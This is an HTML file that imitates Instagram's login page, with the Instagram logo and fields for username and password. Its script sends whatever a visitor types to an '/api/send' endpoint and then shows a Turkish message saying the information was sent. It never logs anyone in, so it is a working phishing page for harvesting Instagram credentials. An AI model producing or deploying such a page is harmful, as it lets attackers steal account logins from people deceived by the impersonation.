<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      text-align: center;
      position: relative;
    }
    .camera-icon {
      position: absolute;
      top: -50px;
      left: 50%;
      transform: translateX(-50%);
      background-color: white;
      border-radius: 50%;
      padding: 10px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    .camera-icon img {
      height: 40px;
      width: 40px;
    }
    .logo {
      margin-top: 20px;
      margin-bottom: 30px;
    }
    .logo img {
      height: 50px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #318ae0;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="camera-icon">
      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram Camera Icon">
    </div>
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
    </div>
    <input type="text" id="username" placeholder="Phone number, username, or email" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="submitLogin()">Log In</button>
  </div>
  <script>
    async function submitLogin() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      alert("Bilgiler g√∂nderildi.");
    }
  </script>
</body>
</html>
